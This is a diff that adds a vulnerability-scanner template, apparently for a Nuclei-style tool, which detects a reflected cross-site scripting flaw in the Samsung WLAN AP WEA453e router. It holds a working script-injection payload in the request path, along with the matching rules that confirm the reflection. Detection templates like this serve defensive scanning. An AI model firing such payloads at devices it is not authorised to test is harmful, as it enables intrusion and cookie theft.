@@ -1,0 +1,29 @@
+id: samsung-wlan-ap-xss
+brief:
+    title: Samsung WLAN AP WEA453e - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: Samsung WLAN AP WEA453e router contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
+    label:
+        - xss
+        - samsung
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs:
+        - "on": word
+          has:
+            - /tmp/www/<script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 404
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
